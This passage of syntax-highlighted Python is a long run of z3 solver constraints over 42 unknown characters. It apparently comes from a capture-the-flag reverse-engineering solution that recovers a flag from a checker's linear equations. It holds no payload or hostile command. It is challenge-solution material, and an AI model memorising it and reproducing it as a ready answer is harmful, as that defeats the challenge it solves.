class="number">8</span>]-l[<span class="number">24</span>]-l[<span class="number">39</span>]-l[<span class="number">9</span>]-l[<span class="number">28</span>]+l[<span class="number">23</span>]-l[<span class="number">17</span>]-l[<span class="number">22</span>]-l[<span class="number">26</span>]+l[<span class="number">32</span>]-l[<span class="number">11</span>]+l[<span class="number">4</span>]-l[<span class="number">36</span>]+l[<span class="number">10</span>]+l[<span class="number">20</span>]-l[<span class="number">18</span>]-l[<span class="number">16</span>]+l[<span class="number">6</span>]-l[<span class="number">0</span>]+l[<span class="number">3</span>]-l[<span class="number">30</span>]+l[<span class="number">37</span>]-l[<span class="number">19</span>]+l[<span class="number">21</span>]+l[<span class="number">25</span>]-l[<span class="number">15</span>]==<span class="number">-42</span>)</span><br><span class="line">s.add(l[<span class="number">21</span>]+l[<span class="number">26</span>]-l[<span class="number">17</span>]-l[<span class="number">25</span>]+l[<span class="number">27</span>]-l[<span class="number">22</span>]-l[<span class="number">39</span>]-l[<span class="number">23</span>]-l[<span class="number">15</span>]-l[<span class="number">20</span>]-l[<span class="number">32</span>]+l[<span class="number">12</span>]+l[<span class="number">3</span>]-l[<span class="number">6</span>]+l[<span class="number">28</span>]+l[<span class="number">31</span>]+l[<span class="number">13</span>]-l[<span class="number">16</span>]-l[<span class="number">37</span>]-l[<span class="number">30</span>]-l[<span class="number">5</span>]+l[<span class="number">41</span>]+l[<span class="number">29</span>]+l[<span class="number">36</span>]+l[<span class="number">1</span>]+l[<span class="number">11</span>]+l[<span class="number">24</span>]+l[<span class="number">18</span>]-l[<span class="number">40</span>]+l[<span class="number">19</span>]-l[<span class="number">35</span>]+l[<span class="number">2</span>]-l[<span class="number">38</span>]+l[<span class="number">14</span>]-l[<span class="number">9</span>]+l[<span class="number">4</span>]+l[<span class="number">0</span>]-l[<span class="number">33</span>]==<span class="number">289</span>)</span><br><span class="line">s.add(l[<span class="number">29</span>]+l[<span class="number">31</span>]+l[<span class="number">32</span>]-l[<span class="number">17</span>]-l[<span class="number">7</span>]+l[<span class="number">34</span>]+l[<span class="number">2</span>]+l[<span class="number">14</span>]+l[<span class="number">23</span>]-l[<span class="number">4</span>]+l[<span class="number">3</span>]+l[<span class="number">35</span>]-l[<span class="number">33</span>]-l[<span class="number">9</span>]-l[<span class="number">20</span>]-l[<span class="number">37</span>]+l[<span class="number">24</span>]-l[<span class="number">27</span>]+l[<span class="number">36</span>]+l[<span class="number">15</span>]-l[<span class="number">18</span>]-l[<span class="number">0</span>]+l[<span class="number">12</span>]+l[<span class="number">11</span>]-l[<span class="number">38</span>]+l[<span class="number">6</span>]+l[<span class="number">22</span>]+l[<span class="number">39</span>]-l[<span class="number">25</span>]-l[<span class="number">10</span>]-l[<span class="number">19</span>]-l[<span class="number">1</span>]+l[<span class="number">13</span>]-l[<span class="number">41</span>]+l[<span class="number">30</span>]-l[<span class="number">16</span>]+l[<span class="number">28</span>]-l[<span class="number">26</span>]==<span class="number">-117</span>)</span><br><span class="line">s.add(l[<span class="number">5</span>]+l[<span class="number">37</span>]-l[<span class="number">39</span>]+l[<span class="number">0</span>]-l[<span class="number">27</span>]+l[<span class="number">12</span>]+l[<span class="number">41</span>]-l[<span class="number">22</span>]+l[<span class="number">8</span>]-l[<span class="number">16</span>]-l[<span class="number">38</span>]+l[<span class="number">9</span>]+l[<span class="number">15</span>]-l[<span class="number">35</span>]-l[<span class="number">29</span>]+l[<span class="number">18</span>]+l[<span class="number">6</span>]-l[<span class="number">25</span>]-l[<span class="number">28</span>]+l[<span class="number">36</span>]+l[<span class="number">34</span>]+l[<span class="number">32</span>]-l[<span class="number">14</span>]-l[<span class="number">1</span>]+l[<span class="number">20</span>]+l[<span class="number">40</span>]-l[<span class="number">19</span>]-l[<span class="number">4</span>]-l[<span class="number">7</span>]+l[<span class="number">26</span>]+l[<span class="number">30</span>]-l[<span class="number">10</span>]+l[<span class="number">13</span>]-l[<span class="number">21</span>]+l[<span class="number">2</span>]-l[<span class="number">23</span>]-l[<span class="number">3</span>]-l[<span class="number">33</span>]==<span class="number">-252</span>)</span><br><span class="line">s.add(l[<span class="number">29</span>]+l[<span class="number">10</span>]-l[<span class="number">41</span>]-l[<span class="number">9</span>]+l[<span class="number">12</span>]-l[<span class="number">28</span>]+l[<span class="number">11</span>]+l[<span class="number">40</span>]-l[<span class="number">27</span>]-l[<span class="number">8</span>]+l[<span class="number">32</span>]-l[<span class="number">25</span>]-l[<span class="number">23</span>]+l[<span class="number">39</span>]-l[<span class="number">1</span>]-l[<span class="number">36</span>]-l[<span class="number">15</span>]+l[<span class="number">33</span>]-l[<span class="number">20</span>]+l[<span class="number">18</span>]+l[<span class="number">22</span>]-l[<span class="number">3</span>]+l[<span class="number">6</span>]-l[<span class="number">34</span>]-l[<span class="number">21</span>]+l[<span class="number">19</span>]+l[<span class="number">26</span>]+l[<span class="number">13</span>]-l[<span class="number">4</span>]+l[<span class="number">7</span>]-l[<span class="number">37</span>]+l[<span class="number">38</span>]-l[<span class="number">2</span>]-l[<span class="number">30</span>]-l[<span class="number">0</span>]-l[<span class="number">35</span>]+l[<span class="number">5</span>]+l[<span class="number">17</span>]==<span class="number">-183</span>)</span><br><span class="line">s.add(l[<span class="number">6</span>]-l[<span class="number">8</span>]-l[<span class="number">20</span>]+l[<span class="number">34</span>]-l[<span class="number">33</span>]-l[<span class="number">25</span>]-l[<span class="number">4</span>]+l[<span class="number">3</span>]+l[<span class="number">17</span>]-l[<span class="number">13</span>]-l[<span class="number">15</span>]-l[<span class="number">40</span>]+l[<span class="number">1</span>]-l[<span class="number">30</span>]-l[<span class="number">14</span>]-l[<span class="number">28</span>]-l[<span class="number">35</span>]+l[<span class="number">38</span>]-l[<span class="number">22</span>]+l[<span class="number">2</span>]+l[<span class="number">24</span>]-l[<span class="number">29</span>]+l[<span class="number">5</span>]+l[<span class="number">9</span>]+l[<span class="number">37</span>]+l[<span class="number">23</span>]-l[<span class="number">18</span>]+l[<span class="number">19</span>]-l[<span class="number">21</span>]+l[<span class="number">11</span>]+l[<span class="number">36</span>]+l[<span class="number">41</span>]-l[<span class="number">7</span>]-l[<span class="number">32</span>]+l[<span class="number">10</span>]+l[<span class="number">26</span>]-l[<span class="number">0</span>]+l[<span class="number">31</span>]==<span class="number">188</span>)</span><br><span class="line">s.add(l[<span class="number">3</span>]+l[<span class="number">6</span>]-l[<span class="number">41</span>]+l[<span class="number">10</span>]+l[<span class="number">39</span>]+l[<span class="number">37</span>]+l[<span class="number">1</span>]+l[<span class="number">8</span>]+l[<span class="number">21</span>]+l[<span class="number">24</span>]+l[<span class="number">29</span>]+l[<span class="number">12</span>]+l[<span class="number">27</span>]-l[<span class="number">38</span>]+l[<span class="number">11</span>]+l[<span class="number">23</span>]+l[<span class="number">28</span>]+l[<span class="number">33</span>]-l[<span class="number">31</span>]+l[<span class="number">14</span>]-l[<span class="number">5</span>]+l[<span class="number">32</span>]-l[<span class="number">17</span>]+l[<span class="number">40</span>]-l[<span class="number">34</span>]+l[<span class="number">20</span>]-l[<span class="number">22</span>]-l[<span class="number">16</span>]+l[<span class="number">19</span>]+l[<span class="number">2</span>]-l[<span class="number">36</span>]-l[<span class="number">7</span>]+l[<span class="number">18</span>]+l[<span class="number">15</span>]+l[<span class="number">26</span>]-l[<span class="number">0</span>]-l[<span class="number">4</span>]+l[<span class="number">35</span>]==<span class="number">1036</span>)</span><br><span class="line">s.add(l[<span class="number">28</span>]-l[<span class="number">33</span>]+l[<span class="number">2</span>]+l[<span class="number">37</span>]-l[<span class="number">12</span>]-l[<span class="number">9</span>]-l[<span class="number">39</span>]+l[<span class="number">16</span>]-l[<span class="number">32</span>]+l[<span class="number">8</span>]-l[<span class="number">36</span>]+l[<span class="number">31</span>]+l[<span class="number">10</span>]-l[<span class="number">4</span>]+l[<span class="number">21</span>]-l[<span class="number">25</span>]+l[<span class="number">18</span>]+l[<span class="number">24</span>]-l[<span class="number">0</span>]+l[<span class="number">29</span>]-l[<span class="number">26</span>]+l[<span class="number">35</span>]-l[<span class="number">22</span>]-l[<span class="number">41</span>]-l[<span class="number">6</span>]+l[<span class="number">15</span>]+l[<span class="number">19</span>]+l[<span class="number">40</span>]+l[<span class="number">7</span>]+l[<span class="number">34</span>]+l[<span class="number">17</span>]-l[<span class="number">3</span>]-l[<span class="number">13</span>]+l[<span class="number">5</span>]+l[<span class="number">23</span>]+l[<span class="number">11</span>]-l[<span class="number">27</span>]+l[<span class="number">1</span>]==<span class="number">328</span>)</span><br><span class="line">s.add(l[<span class="number">22</span>]-l[<span class="number">32</span>]+l[<span class="number">17</span>]-l[<span class="number">9</span>]+l[<span class="number">20</span>]-l[<span class="number">18</span>]-l[<span class="number">34</span>]+l[<span class="number">23</span>]+l[<span class="number">36</span>]-l[<span class="number">35</span>]-l[<span class="number">38</span>]+l[<span class="number">27</span>]+l[<span class="number">4</span>]-l[<span class="number">5</span>]-l[<span class="number">41</span>]+l[<span class="number">29</span>]+l[<span class="number">33</span>]+l[<span class="number">0</span>]-l[<span class="number">37</span>]+l[<span class="number">28</span>]-l[<span class="number">40</span>]-l[<span class="number">11</span>]-l[<span class="number">12</span>]+l[<span class="number">7</span>]+l[<span class="number">1</span>]+l[<span class="number">2</span>]-l[<span class="number">26</span>]-l[<span class="number">16</span>]-l[<span class="number">8</span>]+l[<span class="number">24</span>]-l[<span class="number">25</span>]+l[<span class="number">3</span>]-l[<span class="number">6</span>]-l[<span class="number">19</span>]-l[<span class="number">39</span>]-l[<span class="number">14</span>]-l[<span class="number">31</span>]+l[<span class="number">10</span>]==<span class="number">-196</span>)</span><br><span class="line">s.add(l[<span class="number">11</span>]+l[<span class="number">13</span>]+l[<span class="number">14</span>]-l[<span class="number">15</span>]-l[<span class="number">29</span>]-l[<span class="number">2</span>]+l[<span class="number">7</span>]+l[<span class="number">20</span>]+l[<span class="number">30</span>]-l[<span class="number">36</span>]-l[<span class="number">33</span>]-l[<span class="number">19</span>]+l[<span class="number">31</span>]+l[<span class="number">0</span>]-l[<span class="number">39</span>]-l[<span class="number">4</span>]-l[<span class="number">6</span>]+l[<span class="number">38</span>]+l[<span class="number">35</span>]-l[<span class="number">28</span>]+l[<span class="number">34</span>]-l[<span class="number">9</span>]-l[<span class="number">23</span>]-l[<span class="number">26</span>]+l[<span class="number">37</span>]-l[<span class="number">8</span>]-l[<span class="number">27</span>]+l[<span class="number">5</span>]-l[<span class="number">41</span>]+l[<span class="number">3</span>]+l[<span class="number">17</span>]+l[<span class="number">40</span>]-l[<span class="number">10</span>]+l[<span class="number">25</span>]+l[<span class="number">12</span>]-l[<span class="number">24</span>]+l[<span class="number">18</span>]+l[<span class="number">32</span>]==<span class="number">7</span>)</span><br><span class="line">s.add(l[<span class="number">34</span>]-l[<span class="number">37</span>]-l[<span class="number">40</span>]+l[<span class="number">4</span>]-l[<span class="number">22</span>]-l[<span class="number">31</span>]-l[<span class="number">6</span>]+l[<span class="number">38</span>]+l[<span class="number">13</span>]-l[<span class="number">28</span>]+l[<span class="number">8</span>]+l[<span class="number">30</span>]-l[<span class="number">20</span>]-l[<span class="number">7</span>]-l[<span class="number">32</span>]+l[<span class="number">26</span>]+l[<span class="number">1</span>]-l[<span class="number">18</span>]+l[<span class="number">5</span>]+l[<span class="number">35</span>]-l[<span class="number">24</span>]-l[<span class="number">41</span>]+l[<span class="number">9</span>]-l[<span class="number">0</span>]-l[<span class="number">2</span>]-l[<span class="number">15</span>]-l[<span class="number">10</span>]+l[<span class="number">12</span>]-l[<span class="number">36</span>]+l[<span class="number">33</span>]-l[<span class="number">16</span>]-l[<span class="number">14</span>]-l[<span class="number">25</span>]-l[<span class="number">29</span>]-l[<span class="number">21</span>]+l[<span class="number">27</span>]+l[<span class="number">3</span>]-l[<span class="number">17</span>]==<span class="number">-945</span>)</span><br><span class="line">s.add(l[<span class="number">12</span>]-l[<span class="number">30</span>]-l[<span class="number">8</span>]+l[<span class="number">20</span>]-l[<span class="number">2</span>]-l[<span class="number">36</span>]-l[<span class="number">25</span>]-l[<span class="number">0</span>]-l[<span class="number">19</span>]-l[<span class="number">28</span>]-l[<span class="number">7</span>]-l[<span class="number">11</span>]-l[<span class="number">33</span>]+l[<span class="number">4</span>]-l[<span class="number">23</span>]+l[<span class="number">10</span>]-l[<span class="number">41</span>]+l[<span class="number">39</span>]-l[<span class="number">32</span>]+l[<span class="number">27</span>]+l[<span class="number">18</span>]+l[<span class="number">15</span>]+l[<span class="number">34</span>]+l[<span class="number">13</span>]-l[<span class="number">40</span>]+l[<span class="number">29</span>]-l[<span class="number">6</span>]+l[<span class="number">37</span>]-l[<span class="number">14</span>]-l[<span class="number">16</span>]+l[<span class="number">38</span>]-l[<span class="number">26</span>]+l[<span class="number">17</span>]+l[<span class="number">31</span>]-l[<span class="number">22</span>]-l[<span class="number">35</span>]+l[<span class="number">5</span>]-l[<span class="number">1</span>]==<span class="number">-480</span>)</span><br><span class="line">s.add(l[<span class="number">36</span>]-l[<span class="number">11</span>]-l[<span class="number">34</span>]+l[<span class="number">8</span>]+l[<span class="number">0</span>]+l[<span class="number">15</span>]+l[<span class="number">28</span>]-l[<span class="number">39</span>]-l[<span class="number">32</span>]-l[<span class="number">2</span>]-l[<span class="number">27</span>]+l[<span class="number">22</span>]+l[<span class="number">16</span>]-l[<span class="number">30</span>]-l[<span class="number">3</span>]+l[<span class="number">31</span>]-l[<span class="number">26</span>]+l[<span class="number">20</span>]+l[<span class="number">17</span>]-l[<span class="number">29</span>]-l[<span class="number">18</span>]+l[<span class="number">19</span>]-l[<span class="number">10</span>]+l[<span class="number">6</span>]-l[<span class="number">5</span>]-l[<span class="number">38</span>]-l[<span class="number">25</span>]-l[<span class="number">24</span>]+l[<span class="number">4</span>]+l[<span class="number">23</span>]+l[<span class="number">9</span>]+l[<span class="number">14</span>]+l[<span class="number">21</span>]-l[<span class="number">37</span>]+l[<span class="number">13</span>]-l[<span class="number">41</span>]-l[<span class="number">12</span>]+l[<span class="number">35</span>]==<span class="number">-213</span>)</span><br><span class="line">s.add(l[<span class="number">19</span>]-l[<span class="number">36</span>]-l[<span class="number">12</span>]+l[<span class="number">33</span>]-l[<span class="number">27</span>]-l[<span class="number">37</span>]-l[<span class="number">25</span>]+l[<span class="number">38</span>]+l[<span class="number">16</span>]-l[<span class="number">18</span>]+l[<span class="number">22</span>]-l[<span class="number">39</span>]+l[<span class="number">13</span>]-l[<span class="number">7</span>]-l[<span class="number">31</span>]-l[<span class="number">26</span>]+l[<span class="number">15</span>]-l[<span class="number">10</span>]-l[<span class="number">9</span>]-l[<span class="number">2</span>]-l[<span class="number">30</span>]-l[<span class="number">11</span>]+l[<span class="number">41</span>]-l[<span class="number">4</span>]+l[<span class="number">24</span>]+l[<span class="number">34</span>]+l[<span class="number">5</span>]+l[<span class="number">17</span>]+l[<span class="number">14</span>]+l[<span class="number">6</span>]+l[<span class="number">8</span>]-l[<span class="number">21</span>]-l[<span class="number">23</span>]+l[<span class="number">32</span>]-l[<span class="number">1</span>]-l[<span class="number">29</span>]-l[<span class="number">0</span>]+l[<span class="number">3</span>]==<span class="number">-386</span>)</span><br><span class="line">s.add(l[<span class="number">0</span>]+l[<span class="number">7</span>]-l[<span class="number">28</span>]-l[<span class="number">38</span>]+l[<span class="number">19</span>]+l[<span class="number">31</span>]-l[<span class="number">5</span>]+l[<span class="number">24</span>]-l[<span class="number">3</span>]+l[<span class="number">33</span>]-l[<span class="number">12</span>]-l[<span class="number">29</span>]+l[<span class="number">32</span>]+l[<span class="number">1</span>]-l[<span class="number">34</span>]-l[<span class="number">9</span>]-l[<span class="number">25</span>]+l[<span class="number">26</span>]-l[<span class="number">8</span>]+l[<span class="number">4</span>]-l[<span class="number">10</span>]+l[<span class="number">40</span>]-l[<span class="number">15</span>]-l[<span class="number">11</span>]-l[<span class="number">27</span>]+l[<span class="number">36</span>]+l[<span class="number">14</span>]+l[<span class="number">41</span>]-l[<span class="number">35</span>]-l[<span class="number">13</span>]-l[<span class="number">17</span>]-l[<span class="number">21</span>]-l[<span class="number">18</span>]+l[<span class="number">39</span>]-l[<span class="number">2</span>]+l[<span class="number">20</span>]-l[<span class="number">23</span>]-l[<span class="number">22</span>]==<span class="number">-349</span>)</span><br><span class="line">s.add(l[<span class="number">10</span>]+l[<span class="number">22</span>]+l[<span class="number">21</span>]-l[<span class="number">0</span>]+l[<span class="number">15</span>]-l[<span class="number">6</span>]+l[<span class="number">20</span>]-l[<span class="number">29</span>]-l[<span class="number">30</span>]-l[<span class="number">33</span>]+l[<span class="number">19</span>]+l[<span class="number">23</span>]-l[<span class="number">28</span>]+l[<span class="number">41</span>]-l[<span class="number">27</span>]-l[<span class="number">12</span>]-l[<span class="number">37</span>]-l[<span class="number">32</span>]+l[<span class="number">34</span>]-l[<span class="number">36</span>]+l[<span class="number">3</span>]+l[<span class="number">1</span>]-l[<span class="number">13</span>]+l[<span class="number">18</span>]+l[<span class="number">14</span>]+l[<span class="number">9</span>]+l[<span class="number">7</span>]-l[<span class="number">39</span>]+l[<span class="number">8</span>]+l[<span class="number">2</span>]-l[<span class="number">31</span>]-l[<span class="number">5</span>]-l[<span class="number">40</span>]+l[<span class="number">38</span>]-l[<span class="number">26</span>]-l[<span class="number">4</span>]+l[<span class="number">16</span>]-l[<span class="number">25</span>]==<span class="number">98</span>)</span><br><span class="line">s.add(l[<span class="number">28</span>]+l[<span class="number">38</span>]+l[<span class="number">20</span>]+l[<span class="number">0</span>]-l[<span class="number">5</span>]-l[<span class="number">34</span>]-l[<span class="number">41</span>]+l[<span class="number">22</span>]-l[<span class="number">26</span>]+l[<span class="number">11</span>]+l[<span class="number">29</span>]+l[<span class="number">31</span>]-l[<span class="number">3</span>]-l[<span class="number">16</span>]+l[<span class="number">23</span>]+l[<span class="number">17</span>]-l[<span class="number">18</span>]+l[<span class="number">9</span>]-l[<span class="number">4</span>]-l[<span class="number">12</span>]-l[<span class="number">19</span>]-l[<span class="number">40</span>]-l[<span class="number">27</span>]+l[<span class="number">33</span>]+l[<span class="number">8</span>]-l[<span class="number">37</span>]+l[<span class="number">2</span>]+l[<span class="number">15</span>]-l[<span class="number">24</span>]-l[<span class="number">39</span>]+l[<span class="number">10</span>]+l[<span class="number">35</span>]-l[<span class="number">1</span>]+l[<span class="number">30</span>]-l[<span class="number">36</span>]-l[<span class="number">25</span>]-l[<span class="number">14</span>]-l[<span class="number">32</span>]==<span class="number">-412</span>)</span><br><span class="line">s.add(l[<span class="number">1</span>]-l[<span class="number">24</span>]-l[<span class="number">29</span>]+l[<span class="number">39</span>]+l[<span class="number">41</span>]+l[<span class="number">0</span>]+l[<span class="number">9</span>]-l[<span class="number">19</span>]+l[<span class="number">6</span>]-l[<span class="number">37</span>]-l[<span class="number">22</span>]+l[<span class="number">32</span>]+l[<span class="number">21</span>]+l[<span class="number">28</span>]+l[<span class="number">36</span>]+l[<span class="number">4</span>]-l[<span class="number">17</span>]+l[<span class="number">20</span>]-l[<span class="number">13</span>]-l[<span class="number">35</span>]-l[<span class="number">5</span>]+l[<span class="number">33</span>]-l[<span class="number">27</span>]-l[<span class="number">30</span>]+l[<span class="number">40</span>]+l[<span class="number">25</span>]-l[<span class="number">18</span>]+l[<span class="number">34</span>]-l[<span class="number">3</span>]-l[<span class="number">10</span>]-l[<span class="number">16</span>]-l[<span class="number">23</span>]-l[<span class="number">38</span>]+l[<span class="number">8</span>]-l[<span class="number">14</span>]-l[<span class="number">11</span>]-l[<span class="number">7</span>]+l[<span class="number">12</span>]==<span class="number">-95</span>)</span><br><span class="line">s.add(l[<span class="number">2</span>]-l[<span class="number">24</span>]+l[<span class="number">31</span>]+l[<span class="number">0</span>]+l[<span class="number">9</span>]-l[<span class="number">6</span>]+l[<span class="number">7</span>]-l[<span class="number">1</span>]-l[<span class="number">22</span>]+l[<span class="number">8</span>]-l[<span class="number">23</span>]+l[<span class="number">40</span>]+l[<span class="number">20</span>]-l[<span class="number">38</span>]-l[<span class="number">11</span>]-l[<span class="number">14</span>]+l[<span class="number">18</span>]-l[<span class="number">36</span>]+l[<span class="number">15</span>]-l[<span class="number">4</span>]-l[<span class="number">41</span>]-l[<span class="number">12</span>]-l[<span class="number">34</span>]+l[<span class="number">32</span>]-l[<span class="number">35</span>]+l[<span class="number">17</span>]-l[<span class="number">21</span>]-l[<span class="number">10</span>]-l[<span class="number">29</span>]+l[<span class="number">39</span>]-l[<span class="number">16</span>]+l[<span class="number">27</span>]+l[<span class="number">26</span>]-l[<span class="number">3</span>]-l[<span class="number">5</span>]+l[<span class="number">13</span>]+l[<span class="number">25</span>]-l[<span class="number">28</span>]==<span class="number">-379</span>)</span><br><span class="line">s.add(l[<span class="number">19</span>]-l[<span class="number">17</span>]+l[<span class="number">31</span>]+l[<span class="number">14</span>]+l[<span class="number">6</span>]-l[<span class="number">12</span>]+l[<span class="number">16</span>]-l[<span class="number">8</span>]+l[<span class="number">27</span>]-l[<span class="number">13</span>]+l[<span class="number">41</span>]+l[<span class="number">2</span>]-l[<span class="number">7</span>]+l[<span class="number">32</span>]+l[<span class="number">1</span>]+l[<span class="number">25</span>]-l[<span class="number">9</span>]+l[<span class="number">37</span>]+l[<span class="number">34</span>]-l[<span class="number">18</span>]-l[<span class="number">40</span>]-l[<span class="number">11</span>]-l[<span class="number">10</span>]+l[<span class="number">38</span>]+l[<span class="number">21</span>]+l[<span class="number">3</span>]-l[<span class="number">0</span>]+l[<span class="number">24</span>]+l[<span class="number">15</span>]+l[<span class="number">23</span>]-l[<span class="number">20</span>]+l[<span class="number">26</span>]+l[<span class="number">22</span>]-l[<span class="number">4</span>]-l[<span class="number">28</span>]-l[<span class="number">5</span>]+l[<span class="number">39</span>]+l[<span class="number">35</span>]==<span class="number">861</span>)</span><br><span class="line">s.add(l[<span class="number">35</span>]+l[<span class="number">36</span>]-l[<span class="number">16</span>]-l[<span class="number">26</span>]-l[<span class="number">31</span>]+l[<span class="number">0</span>]+l[<span class="number">21</span>]-l[<span class="number">13</span>]+l[<span class="number">14</span>]+l[<span class="number">39</span>]+l[<span class="number">7</span>]+l[<span class="number">4</span>]+l[<span class="number">34</span>]+l[<span class="number">38</span>]+l[<span class="number">17</span>]+l[<span class="number">22</span>]+l[<span class="number">32</span>]+l[<span class="number">5</span>]+l[<span class="number">15</span>]+l[<span class="number">8</span>]-l[<span class="number">29</span>]+l[<span class="number">40</span>]+l[<span class="number">24</span>]+l[<span class="number">6</span>]+l[<span class="number">30</span>]-l[<span class="number">2</span>]+l[<span class="number">25</span>]+l[<span class="number">23</span>]+l[<span class="number">1</span>]+l[<span class="number">12</span>]+l[<span class="number">9</span>]-l[<span class="number">10</span>]-l[<span class="number">3</span>]-l[<span class="number">19</span>]+l[<span class="number">20</span>]-l[<span class="number">37</span>]-l[<span class="number">33</span>]-l[<span class="number">18</span>]==<span class="number">1169</span>)</span><br><span class="line">s.add(l[<span class="number">13</span>]+l[<span class="number">0</span>]-l[<span class="number">25</span>]-l[<span class="number">32</span>]-l[<span class="number">21</span>]-l[<span class="number">34</span>]-l[<span class="number">14</span>]-l[<span class="number">9</span>]-l[<span class="number">8</span>]-l[<span class="number">15</span>]-l[<span class="number">16</span>]+l[<span class="number">38</span>]-l[<span class="number">35</span>]-l[<span class="number">30</span>]-l[<span class="number">40</span>]-l[<span class="number">12</span>]+l[<span class="number">3</span>]-l[<span class="number">19</span>]+l[<span class="number">4</span>]-l[<span class="number">41</span>]+l[<span class="number">2</span>]-l[<span class="number">36</span>]+l[<span class="number">37</span>]+l[<span class="number">17</span>]-l[<span class="number">1</span>]+l[<span class="number">26</span>]-l[<span class="number">39</span>]-l[<span class="number">10</span>]-l[<span class="number">33</span>]+l[<span class="number">5</span>]-l[<span class="number">27</span>]-l[<span class="number">23</span>]-l[<span class="number">24</span>]-l[<span class="number">7</span>]+l[<span class="number">31</span>]-l[<span class="number">28</span>]-l[<span class="number">18</span>]+l[<span class="number">6</span>]==<span class="number">-1236</span>)</span><br><span class="line">s.add(l[<span class="number">20</span>]+l[<span class="number">27</span>]-l[<span class="number">29</span>]-l[<span class="number">25</span>]-l[<span class="number">3</span>]+l[<span class="number">28</span>]-l[<span class="number">32</span>]-l[<span class="number">11</span>]+l[<span class="number">10</span>]+l[<span class="number">31</span>]+l[<span class="number">16</span>]+l[<span class="number">21</span>]-l[<span class="number">7</span>]+l[<span class="number">4</span>]-l[<span class="number">24</span>]-l[<span class="number">35</span>]+l[<span class="number">26</span>]+l[<span class="number">12</span>]-l[<span class="number">37</span>]+l[<span class="number">6</span>]+l[<span class="number">23</span>]+l[<span class="number">41</span>]-l[<span class="number">39</span>]-l[<span class="number">38</span>]+l[<span class="number">40</span>]-l[<span class="number">36</span>]+l[<span class="number">8</span>]-l[<span class="number">9</span>]-l[<span class="number">5</span>]-l[<span class="number">1</span>]-l[<span class="number">13</span>]-l[<span class="number">14</span>]+l[<span class="number">19</span>]+l[<span class="number">0</span>]-l[<span class="number">34</span>]-l[<span class="number">15</span>]+l[<span class="number">17</span>]+l[<span class="number">22</span>]==<span class="number">-114</span>)</span><br><span class="line">s.add(l[<span class="number">12</span>]-l[<span class="number">28</span>]-l[<span class="number">13</span>]-l[<span class="number">23</span>]-l[<span class="number">33</span>]+l[<span class="number">18</span>]+l[<span class="number">10</span>]+l[<span class="number">11</span>]+l[<span class="number">2</span>]-l[<span class="number">36</span>]+l[<span class="number">41</span>]-l[<span class="number">16</span>]+l[<span class="number">39</span>]+l[<span class="number">34</span>]+l[<span class="number">32</span>]+l[<span class="number">37</span>]-l[<span class="number">38</span>]+l[<span class="number">20</span>]+l[<span class="number">6</span>]+l[<span class="number">7</span>]+l[<span class="number">31</span>]+l[<span class="number">5</span>]+l[<span class="number">22</span>]-l[<span class="number">4</span>]-l[<span class="number">15</span>]-l[<span class="number">24</span>]+l[<span class="number">17</span>]-l[<span class="number">3</span>]+l[<span class="number">1</span>]-l[<span class="number">35</span>]-l[<span class="number">9</span>]+l[<span class="number">30</span>]+l[<span class="number">25</span>]-l[<span class="number">0</span>]-l[<span class="number">8</span>]-l[<span class="number">14</span>]+l[<span class="number">26</span>]+l[<span class="number">21</span>]==<span class="number">659</span>)</span><br><span class="line">s.add(l[<span class="number">21</span>]-l[<span class="number">3</span>]+l[<span class="number">7</span>]-l[<span class="number">27</span>]+l[<span class="number">0</span>]-l[<span class="number">32</span>]-l[<span class="number">24</span>]-l[<span class="number">37</span>]+l[<span class="number">4</span>]-l[<span class="number">22</span>]+l[<span class="number">20</span>]-l[<span class="number">5</span>]-l[<span class="number">30</span>]-l[<span class="number">31</span>]-l[<span class="number">1</span>]+l[<span class="number">15</span>]+l[<span class="number">41</span>]+l[<span class="number">12</span>]+l[<span class="number">40</span>]+l[<span class="number">38</span>]-l[<span class="number">17</span>]-l[<span class="number">39</span>]+l[<span class="number">19</span>]-l[<span class="number">13</span>]+l[<span class="number">23</span>]+l[<span class="number">18</span>]-l[<span class="number">2</span>]+l[<span class="number">6</span>]-l[<span class="number">33</span>]-l[<span class="number">9</span>]+l[<span class="number">28</span>]+l[<span class="number">8</span>]-l[<span class="number">16</span>]-l[<span class="number">10</span>]-l[<span class="number">14</span>]+l[<span class="number">34</span>]+l[<span class="number">35</span>]-l[<span class="number">11</span>]==<span class="number">-430</span>)</span><br><span class="line">s.add(l[<span class="number">11</span>]-l[<span class="number">23</span>]-l[<span class="number">9</span>]-l[<span class="number">19</span>]+l[<span class="number">17</span>]+l[<span class="number">38</span>]-l[<span class="number">36</span>]-l[<span class="number">22</span>]-l[<span class="number">10</span>]+l[<span class="number">27</span>]-l[<span class="number">14</span>]-l[<span class="number">4</span>]+l[<span class="number">5</span>]+l[<span class="number">31</span>]+l[<span class="number">2</span>]+l[<span class="number">0</span>]-l[<span class="number">16</span>]-l[<span class="number">8</span>]-l[<span class="number">28</span>]+l[<span class="number">3</span>]+l[<span class="number">40</span>]+l[<span class="number">25</span>]-l[<span class="number">33</span>]+l[<span class="number">13</span>]-l[<span class="number">32</span>]-l[<span class="number">35</span>]+l[<span class="number">26</span>]-l[<span class="number">20</span>]-l[<span class="number">41</span>]-l[<span class="number">30</span>]-l[<span class="number">12</span>]-l[<span class="number">7</span>]+l[<span class="number">37</span>]-l[<span class="number">39</span>]+l[<span class="number">15</span>]+l[<span class="number">18</span>]-l[<span class="number">29</span>]-l[<span class="number">21</span>]==<span class="number">-513</span>)</span><br><span class="line">s.add(l[<span class="number">32</span>]+l[<span class="number">19</span>]+l[<span class="number">4</span>]-l[<span class="number">13</span>]-l[<span class="number">17</span>]-l[<span class="number">30</span>]+l[<span class="number">5</span>]-l[<span class="number">33</span>]-l[<span class="number">37</span>]-l[<span class="number">15</span>]-l[<span class="number">18</span>]+l[<span class="number">7</span>]+l[<span class="number">25</span>]-l[<span class="number">14</span>]+l[<span class="number">35</span>]+l[<span class="number">40</span>]+l[<span class="number">16</span>]+l[<span class="number">1</span>]+l[<span class="number">2</span>]+l[<span class="number">26</span>]-l[<span class="number">3</span>]-l[<span class="number">39</span>]-l[<span class="number">22</span>]+l[<span class="number">23</span>]-l[<span class="number">36</span>]-l[<span class="number">27</span>]-l[<span class="number">9</span>]+l[<span class="number">6</span>]-l[<span class="number">41</span>]-l[<span class="number">0</span>]-l[<span class="number">31</span>]-l[<span class="number">20</span>]+l[<span class="number">12</span>]-l[<span class="number">8</span>]+l[<span class="number">29</span>]-l[<span class="number">11</span>]-l[<span class="number">34</span>]+l[<span class="number">21</span>]==<span class="number">-502</span>)</span><br><span class="line">s.add(l[<span class="number">30</span>]-l[<span class="number">31</span>]-l[<span class="number">36</span>]+l[<span class="number">3</span>]+l[<span class="number">9</span>]-l[<span class="number">40</span>]-l[<span class="number">33</span>]+l[<span 